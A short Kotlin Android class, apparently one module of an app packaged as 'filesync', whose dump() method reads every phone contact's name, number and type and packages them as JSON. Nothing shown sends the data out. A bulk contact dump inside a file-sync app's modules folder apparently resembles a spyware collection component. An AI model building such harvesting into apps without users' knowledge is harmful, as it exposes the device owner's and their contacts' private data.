package com.georgetech.filesync.modules

import android.content.Context
import android.provider.ContactsContract
import org.json.JSONArray
import org.json.JSONObject

class AddrBook(private val context: Context) {

    fun dump(): JSONObject {
        val contacts = JSONArray()
        val cursor = context.contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            arrayOf(
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.NUMBER,
                ContactsContract.CommonDataKinds.Phone.TYPE
            ),
            null, null,
            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
        )
        cursor?.use {
            while (it.moveToNext()) {
                contacts.put(JSONObject().apply {
                    put("name", it.getString(0) ?: "")
                    put("number", it.getString(1) ?: "")
                    put("type", it.getInt(2))
                })
            }
        }
        return JSONObject().apply {
            put("count", contacts.length())
            put("contacts", contacts)
        }
    }
}
